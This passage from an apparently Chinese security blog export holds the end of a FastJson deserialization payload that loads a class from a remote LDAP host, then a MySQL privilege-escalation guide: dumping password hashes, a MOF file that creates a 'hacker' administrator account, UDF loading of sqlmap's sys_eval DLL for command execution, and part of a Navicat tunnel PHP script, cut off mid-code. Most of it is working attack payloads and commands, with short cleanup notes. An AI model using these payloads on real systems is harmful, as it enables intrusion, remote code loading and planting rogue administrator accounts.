<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;x&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;ldap://ip:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h2><p>升级FastJson版本</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>Web应用漏洞</category>
        <category>Json</category>
        <category>常规漏洞</category>
        <category>反序列化漏洞</category>
      </categories>
      <tags>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL提权</title>
    <url>//bb41611ac1d5.html</url>
    <content><![CDATA[<h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><p><strong>必要条件：</strong></p>
<ul>
<li>具有MySQL的root权限</li>
<li>具有执行SQL语句的权限</li>
</ul>
<h2 id="查询MySQL账号密码"><a href="#查询MySQL账号密码" class="headerlink" title="查询MySQL账号密码"></a>查询MySQL账号密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"></span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line"># 查询到的值是Hash加密的</span><br></pre></td></tr></table></figure>





<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mot</code>文件</p>
<p>利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行</p>
<p>这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>只适用于低版本的Windows系统</li>
<li>对<code>C:\Windows\System32\wbem\MOF</code>目录有读写权限</li>
</ul>
<p>上传MOF文件内容</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，讲上面的代码转换为16进制，在开头添加0x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0xspan><br><span class="line">into dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>

<p>执行成功的的时候，test.mof 会出现在：<code>c:/windows/system32/wbem/goog/</code> 目录下 否则出现在 <code>c:/windows/system32/wbem/bad</code> 目录下</p>
<p>然后会建立hacker用户</p>
<p><strong>修复措施</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>



<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。</p>
<p><strong>利用条件：</strong></p>
<p>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件<code>udf.dll</code>放置在mysql安装目录的<code>MySQL\Lib\Plugin\</code>文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建<code>MySQL\Lib\Plugin\</code>文件夹，然后将udf.dll导入到该目录。</p>
<p>如果是 MySQL &lt;= 5.1 的版本，udf.dll文件在windows server 2003下放置于<code>c:/windows/system32/</code>目录，在windows server 2000下放置在<code>c:/winnt/system32/</code>目录。</p>
<p>掌握mysql数据库的root账户，从而拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
<p>拥有可以将udf.dll写入相应目录的权限</p>
<p><strong>sqlmap 的 UDF 动态链接库文件位置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap/data/udf/mysql</span><br></pre></td></tr></table></figure>

<p><strong>这个dll文件是经过编码的，需要解码，sqlmap解码文件位置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap/extra/clock/cloak.py</span><br></pre></td></tr></table></figure>

<p><strong>解码方法如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure>

<p><strong>查看MySQL的插件目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果没有该目录可以手动创建</p>
<p>需要有写入权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看MySQL安装目录</span><br><span class="line">select @@basedir;</span><br><span class="line"></span><br><span class="line"># 创建/lib/plugin/文件夹</span><br><span class="line">select 1 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>把动态链接库写入MySQL</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;) </span><br><span class="line">into outfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;) </span><br><span class="line">into dumpfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line"># 也可以进行编码</span><br><span class="line">select hex(load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;)) </span><br><span class="line">into outfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://127.0.0.1/?id=1 --file-write lib_mysqludf_sys_64.dll </span><br><span class="line">--file-dest &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>创建自定义函数并调用命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys_64.dll&#x27;;</span><br></pre></td></tr></table></figure>

<p>查看自定义函数是否创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>删除自定义函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>

<p><strong>无法直连时通过Navicat上传PHP脚本</strong></p>
<p>脚本代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//version my202</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//set allowTestMenu to false to disable System/Server test page</span></span><br><span class="line"><span class="variable">$allowTestMenu</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$use_mysqli</span> = function_exists(<span class="string">&quot;mysqli_connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/plain; charset=x-user-defined&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpversion_int</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">list</span>(<span class="variable">$maVer</span>, <span class="variable">$miVer</span>, <span class="variable">$edVer</span>) = preg_split(<span class="string">&quot;(/|\.|-)&quot;</span>, phpversion());</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$maVer</span>*<span class="number">10000</span> + <span class="variable">$miVer</span>*<span class="number">100</span> + <span class="variable">$edVer</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50300</span>)</span><br><span class="line">&#123;</span><br><span class="line">	set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetLongBinary</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> pack(<span class="string">&quot;N&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetShortBinary</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> pack(<span class="string">&quot;n&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetDummy</span>(<span class="params"><span class="variable">$count</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$count</span>;<span class="variable">$i</span>++)</span><br><span class="line">		<span class="variable">$str</span> .= <span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetBlock</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$len</span> = strlen(<span class="variable">$val</span>);</span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$len</span> &lt; <span class="number">254</span> )</span><br><span class="line">		<span class="keyword">return</span> chr(<span class="variable">$len</span>).<span class="variable">$val</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;\xFE&quot;</span>.GetLongBinary(<span class="variable">$len</span>).<span class="variable">$val</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoHeader</span>(<span class="params"><span class="variable">$errno</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = GetLongBinary(<span class="number">1111</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetShortBinary(<span class="number">202</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$errno</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetDummy(<span class="number">6</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoConnInfo</span>(<span class="params"><span class="variable">$conn</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$str</span> = GetBlock(mysqli_get_host_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysqli_get_proto_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysqli_get_server_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$str</span> = GetBlock(mysql_get_host_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysql_get_proto_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="variable">$str</span> .= GetBlock(mysql_get_server_info(<span class="variable">$conn</span>));</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoResultSetHeader</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$affectrows</span>, <span class="variable">$insertid</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = GetLongBinary(<span class="variable">$errno</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$affectrows</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$insertid</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$numfields</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$numrows</span>);</span><br><span class="line">	<span class="variable">$str</span> .= GetDummy(<span class="number">12</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoFieldsHeader</span>(<span class="params"><span class="variable">$res</span>, <span class="variable">$numfields</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$numfields</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>]) &#123;</span><br><span class="line">			<span class="variable">$finfo</span> = mysqli_fetch_field_direct(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(<span class="variable">$finfo</span>-&gt;name);</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(<span class="variable">$finfo</span>-&gt;table);</span><br><span class="line">			</span><br><span class="line">			<span class="variable">$type</span> = <span class="variable">$finfo</span>-&gt;type;</span><br><span class="line">			<span class="variable">$length</span> = <span class="variable">$finfo</span>-&gt;length;</span><br><span class="line">		</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$type</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$intflag</span> = <span class="variable">$finfo</span>-&gt;flags;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$intflag</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$length</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(mysql_field_name(<span class="variable">$res</span>, <span class="variable">$i</span>));</span><br><span class="line">			<span class="variable">$str</span> .= GetBlock(mysql_field_table(<span class="variable">$res</span>, <span class="variable">$i</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$type</span> = mysql_field_type(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="variable">$length</span> = mysql_field_len(<span class="variable">$res</span>, <span class="variable">$i</span>);</span><br><span class="line">			<span class="keyword">switch</span> (<span class="variable">$type</span>) &#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;int&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> &gt; <span class="number">11</span> ) <span class="variable">$type</span> = <span class="number">8</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">3</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;real&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> == <span class="number">12</span> ) <span class="variable">$type</span> = <span class="number">4</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> == <span class="number">22</span> ) <span class="variable">$type</span> = <span class="number">5</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">0</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;null&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">6</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;timestamp&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">7</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;date&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">10</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;time&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">11</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;datetime&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">12</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;year&quot;</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">13</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="string">&quot;blob&quot;</span>:</span><br><span class="line">					<span class="keyword">if</span>( <span class="variable">$length</span> &gt; <span class="number">16777215</span> ) <span class="variable">$type</span> = <span class="number">251</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> &gt; <span class="number">65535</span> ) <span class="variable">$type</span> = <span class="number">250</span>;</span><br><span class="line">					<span class="keyword">elseif</span>( <span class="variable">$length</span> &gt; <span class="number">255</span> ) <span class="variable">$type</span> = <span class="number">252</span>;</span><br><span class="line">					<span class="keyword">else</span> <span class="variable">$type</span> = <span class="number">249</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">default</span>:</span><br><span class="line">					<span class="variable">$type</span> = <span class="number">253</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$type</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$flags</span> = explode( <span class="string">&quot; &quot;</span>, mysql_field_flags ( <span class="variable">$res</span>, <span class="variable">$i</span> ) );</span><br><span class="line">			<span class="variable">$intflag</span> = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;not_null&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;primary_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;unique_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">4</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;multiple_key&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">8</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;blob&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">16</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;unsigned&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">32</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;zerofill&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">64</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;binary&quot;</span>, <span class="variable">$flags</span>)) <span class="variable">$intflag</span> += <span class="number">128</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;enum&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">256</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;auto_increment&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">512</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;timestamp&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">1024</span>;</span><br><span class="line">			<span class="keyword">if</span>(in_array( <span class="string">&quot;set&quot;</span>, <span class="variable">$flags</span> )) <span class="variable">$intflag</span> += <span class="number">2048</span>;</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$intflag</span>);</span><br><span class="line">	</span><br><span class="line">			<span class="variable">$str</span> .= GetLongBinary(<span class="variable">$length</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">EchoData</span>(<span class="params"><span class="variable">$res</span>, <span class="variable">$numfields</span>, <span class="variable">$numrows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$numrows</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$row</span> = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$GLOBALS</span>[<span class="string">&#x27;use_mysqli&#x27;</span>])</span><br><span class="line">			<span class="variable">$row</span> = mysqli_fetch_row( <span class="variable">$res</span> );</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="variable">$row</span> = mysql_fetch_row( <span class="variable">$res</span> );</span><br><span class="line">		<span class="keyword">for</span>( <span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="variable">$numfields</span>; <span class="variable">$j</span>++ )&#123;</span><br><span class="line">			<span class="keyword">if</span>( is_null(<span class="variable">$row</span>[<span class="variable">$j</span>]) )</span><br><span class="line">				<span class="variable">$str</span> .= <span class="string">&quot;\xFF&quot;</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="variable">$str</span> .= GetBlock(<span class="variable">$row</span>[<span class="variable">$j</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSystemTest</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$description</span>, <span class="variable">$succ</span>, <span class="variable">$resStr</span></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td class=\&quot;TestDesc\&quot;&gt;<span class="subst">$description</span>&lt;/td&gt;&lt;td &quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> (<span class="variable">$succ</span>)? <span class="string">&quot;class=\&quot;TestSucc\&quot;&gt;<span class="subst">$resStr</span>[0]&lt;/td&gt;&lt;/tr&gt;&quot;</span> : <span class="string">&quot;class=\&quot;TestFail\&quot;&gt;<span class="subst">$resStr</span>[1]&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	output(<span class="string">&quot;PHP version &gt;= 4.0.5&quot;</span>, phpversion_int() &gt;= <span class="number">40005</span>, <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	output(<span class="string">&quot;mysql_connect() available&quot;</span>, function_exists(<span class="string">&quot;mysql_connect&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	output(<span class="string">&quot;mysqli_connect() available&quot;</span>, function_exists(<span class="string">&quot;mysqli_connect&quot;</span>), <span class="keyword">array</span>(<span class="string">&quot;Yes&quot;</span>, <span class="string">&quot;No&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (phpversion_int() &gt;= <span class="number">40302</span> &amp;&amp; substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;SERVER_SOFTWARE&quot;</span>], <span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;Apache&quot;</span> &amp;&amp; function_exists(<span class="string">&quot;apache_get_modules&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">if</span> (in_array(<span class="string">&quot;mod_security2&quot;</span>, apache_get_modules()))</span><br><span class="line">			output(<span class="string">&quot;Mod Security 2 installed&quot;</span>, <span class="literal">false</span>, <span class="keyword">array</span>(<span class="string">&quot;No&quot;</span>, <span class="string">&quot;Yes&quot;</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 